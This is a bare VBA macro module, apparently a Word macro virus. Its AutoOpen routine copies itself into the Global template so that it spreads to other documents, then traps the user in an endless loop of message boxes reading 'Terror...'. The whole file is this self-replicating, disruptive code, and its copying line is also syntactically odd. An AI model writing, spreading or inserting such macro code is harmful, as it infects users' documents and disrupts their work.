   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim MakroKopieren
   MakroKopieren WordBasic.Call "DateiName$" + ":AutoOpen", "Global:AutoOpen", 1
   Again:
   WordBasic.MsgBox "Terror..."
   GoTo Again
   End Sub
